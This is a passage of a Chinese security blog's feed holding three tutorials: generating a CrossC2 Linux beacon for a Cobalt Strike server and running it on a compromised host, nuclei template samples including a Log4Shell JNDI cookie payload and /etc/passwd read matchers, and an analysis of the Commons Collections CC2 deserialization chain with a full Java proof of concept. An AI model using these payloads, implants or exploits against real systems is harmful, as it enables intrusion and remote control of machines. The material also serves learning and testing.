title="命令生成上线"></a>命令生成上线</h3><p>首先建一个HTTPS的监听器，必须是HTTPS</p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220213151371.png" alt="image-20231220213151371"></p><p>将服务器的<code>.cobaltstrike.beacon_keys</code>文件放在与下载的genCrossC2.Linux在同一目录下，我直接将genCrossC2.Linux放在了Teamserver的目录下（也可以指定）</p><p>给执行权限然后执行命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./genCrossC2.Linux 192.168.157.201 443 null null Linux x64 <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220213530621.png" alt="image-20231220213530621"></p><p>上传到getshell的机器执行test文件，成功上线Linux机器</p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220213705374.png" alt="image-20231220213705374"></p>]]></content>
    
    
    <summary type="html">利用CrossC2插件Linux上线CS</summary>
    
    
    
    <category term="内网安全" scheme="http://example.com/category/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="内网安全" scheme="http://example.com/tag/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>nuclei常用templates模板</title>
    <link href="http://example.com/posts/1628988354.html"/>
    <id>http://example.com/posts/1628988354.html</id>
    <published>2024-01-31T06:59:13.000Z</published>
    <updated>2024-03-03T14:41:59.750Z</updated>
    
    <content type="html"><![CDATA[<h1 id="nuclei常用templates模板"><a href="#nuclei常用templates模板" class="headerlink" title="nuclei常用templates模板"></a>nuclei常用templates模板</h1><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">base</span>  </span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">base</span> </span><br><span class="line">  <span class="attr">author:</span> <span class="string">msk</span></span><br><span class="line">  <span class="attr">description:</span> <span class="string">描述漏洞基本情况</span></span><br><span class="line">  <span class="attr">severity:</span> <span class="string">info</span> <span class="string">漏洞等级</span></span><br><span class="line">  <span class="attr">reference:</span> <span class="string">https://www.exploit-db.com/ghdb/6814</span>  <span class="string">漏洞来源</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">detect</span> <span class="string">标签</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">veified:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">fofa-query:</span> <span class="string">fofa语法</span></span><br><span class="line">    <span class="attr">hunter-query:</span> <span class="string">鹰图语法</span></span><br><span class="line"></span><br><span class="line"><span class="attr">http:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">raw:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line"><span class="string">        GET /xxxx/xxx HTTP/1.1</span></span><br><span class="line"><span class="string">        Host: &#123;&#123;Hostname&#125;&#125;</span></span><br><span class="line"><span class="string">        Connection: keep-alive</span></span><br><span class="line"><span class="string">        Cookie: OFBiz.Visitor=$&#123;jndi:ldap://&#123;&#123;interactsh-url&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36</span></span><br><span class="line"><span class="string">        Content-Type: application/json;charset=UTF-8</span></span><br><span class="line"><span class="string">        user-client: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">dsl</span></span><br><span class="line">        <span class="attr">dsl:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&#x27;status_code==200 &amp;&amp; contains_all(body,&quot;xxx1&quot;,&quot;xxx2&quot;)&#x27;</span> <span class="comment"># 匹配多个Responses中关键词</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">CVE-xxxx-xxxxx</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">naturehi</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">naturehi</span></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">path:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/(poc部分)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="attr">stop-at-first-match:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">matchers-condition:</span> <span class="string">and</span></span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">regex</span></span><br><span class="line">        <span class="attr">regex:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&quot;(你具体要在响应包所匹配的值)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">status</span></span><br><span class="line">        <span class="attr">status:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="number">200</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attr">id:</span> <span class="string">CNVD-xxxx</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">naturehi</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">naturehi</span></span><br><span class="line"></span><br><span class="line"><span class="attr">variables:</span></span><br><span class="line">  <span class="attr">num1:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;rand_int(800000, 999999)&#125;&#125;</span>&quot;</span></span><br><span class="line">  <span class="attr">num2:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;rand_int(800000, 999999)&#125;&#125;</span>&quot;</span></span><br><span class="line">  <span class="attr">result:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;to_number(num1)*to_number(num2)&#125;&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">http:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">path:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/(poc)<span class="template-variable">&#123;&#123;num1&#125;&#125;</span>*<span class="template-variable">&#123;&#123;num2&#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/(poc)<span class="template-variable">&#123;&#123;num1&#125;&#125;</span>*<span class="template-variable">&#123;&#123;num2&#125;&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="attr">stop-at-first-match:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">matchers-condition:</span> <span class="string">and</span></span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">word</span></span><br><span class="line">        <span class="attr">part:</span> <span class="string">body</span></span><br><span class="line">        <span class="attr">words:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;result&#125;&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">status</span></span><br><span class="line">        <span class="attr">status:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="number">200</span></span><br></pre></td></tr></table></figure><h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attr">id:</span> <span class="string">CNVD-xxx-xxxx</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">naturehi</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">naturehi</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">fofa-query:</span> <span class="string">app=&quot;Landray</span> <span class="string">OA</span> <span class="string">system&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">raw:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line"><span class="string">        POST /(poc路径) HTTP/1.1</span></span><br><span class="line"><span class="string">        Host: &#123;&#123;Hostname&#125;&#125;</span></span><br><span class="line"><span class="string">        Accept: */*</span></span><br><span class="line"><span class="string">        Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"></span><br><span class="line">        <span class="string">var=&#123;&quot;body&quot;:&#123;&quot;POST请求值&quot;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="attr">stop-at-first-match:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">matchers-condition:</span> <span class="string">and</span></span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">regex</span></span><br><span class="line">        <span class="attr">regex:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&quot;（需要匹配的特征值）&quot;</span></span><br><span class="line">        <span class="attr">condition:</span> <span class="string">or</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">status</span></span><br><span class="line">        <span class="attr">status:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="number">200</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">CNVD-xxx-xxx</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">naturehi</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">naturehi</span></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">raw:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line"><span class="string">        POST /(poc)HTTP/1.1</span></span><br><span class="line"><span class="string">        Host: &#123;&#123;Hostname&#125;&#125;</span></span><br><span class="line"><span class="string">        Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"></span><br><span class="line">        <span class="string">（poc请求值）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">regex</span></span><br><span class="line">        <span class="attr">regex:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&quot;(需要匹配的值)&quot;</span></span><br></pre></td></tr></table></figure><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>&#x2F;etc&#x2F;passwd</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">matchers:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">regex</span></span><br><span class="line">     <span class="attr">regex:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">&quot;root:.*:0:0:&quot;</span></span><br><span class="line">     <span class="attr">part:</span> <span class="string">body</span></span><br></pre></td></tr></table></figure><p>C:&#x2F;windows&#x2F;win.ini</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">matchers:</span>    </span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">regex</span></span><br><span class="line">     <span class="attr">regex:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">&quot;bit app support&quot;</span></span><br><span class="line">     <span class="attr">part:</span> <span class="string">body</span></span><br></pre></td></tr></table></figure><p>匹配返回包中的值</p>]]></content>
    
    
    <summary type="html">nuclei常用templates模板</summary>
    
    
    
    <category term="Web安全" scheme="http://example.com/category/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="工具使用" scheme="http://example.com/tag/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java利用链CommonCollections2分析</title>
    <link href="http://example.com/posts/151175659.html"/>
    <id>http://example.com/posts/151175659.html</id>
    <published>2024-01-29T02:06:24.000Z</published>
    <updated>2024-03-03T14:45:14.426Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java利用链CommonCollections2分析"><a href="#Java利用链CommonCollections2分析" class="headerlink" title="Java利用链CommonCollections2分析"></a>Java利用链CommonCollections2分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Commons Collections有两个分支版本：</p><p><code>commons-collections:commons-collections </code></p><p><code>org.apache.commons:commons-collections4</code></p><p>在<code>commons-collections:commons-collections</code>可以使用的利用链在<code>org.apache.commons:commons-collections4</code>中都可以正常使用。在ysoserial中专门为CC4出了两条新的利用链CC2和CC4。</p><h2 id="ysoserial中的CC2"><a href="#ysoserial中的CC2" class="headerlink" title="ysoserial中的CC2"></a>ysoserial中的CC2</h2><p>先看下ysoserial中的CC2是怎么写的</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections2%E5%88%86%E6%9E%90.assets/image-20240129101302220.png" alt="image-20240129101302220"></p><p>根据注释了解大概是通过PriorityQueue.readObject()进行反序列化到TransformingComparator.compare()完成整个利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">...</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br><span class="line"> */</span><br></pre></td></tr></table></figure><p>先看PriorityQueue的readObject，其中调用了heapify方法</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections2%E5%88%86%E6%9E%90.assets/image-20240129102110796.png" alt="image-20240129102110796"></p><p>heapify方法中调用了siftDown方法</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections2%E5%88%86%E6%9E%90.assets/image-20240129102145486.png" alt="image-20240129102145486"></p><p>siftDown方法中调用了siftDownUsingComparator方法</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections2%E5%88%86%E6%9E%90.assets/image-20240129102222646.png" alt="image-20240129102222646"></p><p>siftDownUsingComparator方法调用了comparator.compare方法</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections2%E5%88%86%E6%9E%90.assets/image-20240129102324130.png" alt="image-20240129102324130"></p><p>而comparator是我们在构造时传入的TransformingComparator</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections2%E5%88%86%E6%9E%90.assets/image-20240129102542427.png" alt="image-20240129102542427"></p><p>也就是执行了TransformingComparator.compare再看compare方法调用transformer.transofrm方法，传入的obj是queue拿出的对象</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections2%E5%88%86%E6%9E%90.assets/image-20240129102659856.png" alt="image-20240129102659856"></p><p>而transfomer也是在构造中传入的InvokerTransformer</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections2%E5%88%86%E6%9E%90.assets/image-20240129102818300.png" alt="image-20240129102818300"></p><p>到此已经有了完整利用链</p><h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>需要注意queue中至少要有两个对象，所以add了两次，并且必须要add templatesImp对象否则没有newTransformer方法，在compare调用transform时会报错。也可以使用反射修改queue中的参数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = org.apache.commons.codec.binary.Base64.decodeBase64(<span class="string">&quot;yv66vgAAADIAMwoABwAiCQAjACQIACUKACYAJwoAJgAoBwApBwAqAQAJdHJhbnNmb3JtAQBQKExvcmcvYXBhY2hlL3hhbGFuL3hzbHRjL0RPTTtbTG9yZy9hcGFjaGUveG1sL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAHEx0ZXN0L2xvYWRlci9UZW1wbGF0ZXNJbXBsWDsBAANkb20BABxMb3JnL2FwYWNoZS94YWxhbi94c2x0Yy9ET007AQAVc2VyaWFsaXphdGlvbkhhbmRsZXJzAQAxW0xvcmcvYXBhY2hlL3htbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACsBAHMoTG9yZy9hcGFjaGUveGFsYW4veHNsdGMvRE9NO0xvcmcvYXBhY2hlL3htbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xvcmcvYXBhY2hlL3htbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAPZHRtQXhpc0l0ZXJhdG9yAQAkTG9yZy9hcGFjaGUveG1sL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAUc2VyaWFsaXphdGlvbkhhbmRsZXIBADBMb3JnL2FwYWNoZS94bWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAE1RlbXBsYXRlc0ltcGxYLmphdmEMABoAGwcALAwALQAuAQATdGVtcGxhdGVYIGNvbnN0cnVjdAcALwwAMAAxDAAwADIBABp0ZXN0L2xvYWRlci9UZW1wbGF0ZXNJbXBsWAEAL29yZy9hcGFjaGUveGFsYW4veHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAob3JnL2FwYWNoZS94YWxhbi94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABChJKVYAIQAGAAcAAAAAAAQAAQAIAAkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAAA0ADAAAACAAAwAAAAEADQAOAAAAAAABAA8AEAABAAAAAQARABIAAgATAAAABAABABQAAQAIABUAAgAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABIADAAAACoABAAAAAEADQAOAAAAAAABAA8AEAABAAAAAQAWABcAAgAAAAEAGAAZAAMAEwAAAAQAAQAUAAEAGgAbAAEACgAAAD8AAgABAAAADSq3AAGyAAISA7YABLEAAAACAAsAAAAOAAMAAAAUAAQAFQAMABYADAAAAAwAAQAAAA0ADQAOAAAACQAcAB0AAQAKAAAAOAACAAEAAAAKsgACEQKatgAFsQAAAAIACwAAAAoAAgAAABkACQAaAAwAAAAMAAEAAAAKAB4AHwAAAAEAIAAAAAIAIQ==&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tpi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(tpi, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(tpi, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;TemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(tpi, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">org</span>.apache.xalan.xsltc.trax.TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>],<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer));</span><br><span class="line"></span><br><span class="line">        queue.add(tpi);</span><br><span class="line">        queue.add(tpi);</span><br><span class="line"></span><br><span class="line">        setFieldValue(invokerTransformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, &quot;queue&quot;);</span></span><br><span class="line"><span class="comment">//        queueArray[0] = tpi;</span></span><br><span class="line"><span class="comment">//        queueArray[1] = 1;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"><span class="comment">//        System.out.println(barr);</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections2%E5%88%86%E6%9E%90.assets/image-20240129105550304.png" alt="image-20240129105550304"></p>]]></content>
    
    
    <summary type="html">Java利用链CommonCollections2分析</summary>
    
    
    
    <category term="代码审计" scheme="http://example.com/category/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="Java代码审计" scheme="http://example.com/tag/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>关于TemplatesImpl的Java利用链CommonCollections3</title>
    <link href="http://example.com/posts/461672887.html"/>
    <id>http://example.com/posts/461672887.html</id>
    <published>2024-01-25T11:44:42.000Z</published>
    <updated>2024-03-03T14:59:13.126Z</updated>
    
